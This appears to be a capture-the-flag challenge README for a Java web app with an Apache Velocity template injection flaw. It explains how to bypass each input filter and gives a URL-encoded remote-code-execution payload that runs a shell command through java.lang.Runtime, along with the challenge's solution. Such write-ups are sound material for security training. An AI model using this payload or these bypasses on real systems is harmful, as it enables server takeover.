# COVID-19 Statistics

> To remind you that COVID-19 is real.

## Deploy

```
mvn clean package
docker-compose up -d
```

## Description

In this challenge, there is Velocity template injection vulnerability.
There are some filters though:

### `.replace("\"", "&quot;")`:

This can be annoying because for string literals you have to use `'` character :)

### `.replaceAll("\\$\\w+", "")`
This can be bypassed by putting it in formal reference notation `${<payload>}`, [reference](https://velocity.apache.org/engine/1.7/user-guide.html#formal-reference-notation).

### `.replaceAll("\\#\\w+", "")`
Usually this is used by directives, such as `#set`. However in my PoC this is not used.

### `"#[[" + decoded + "]]#"`.
This is for literals so it won't be parsed by Velocity. Can easily bypassed by adding `]]#` in front of the payload.

## Solve

Change this RCE payload (`sleep 5`) to get the flag.

```
/%5D%5D%23%24%7Bclass.inspect('java.lang.Runtime').type.getRuntime().exec('sleep%205').waitFor()%7D
```
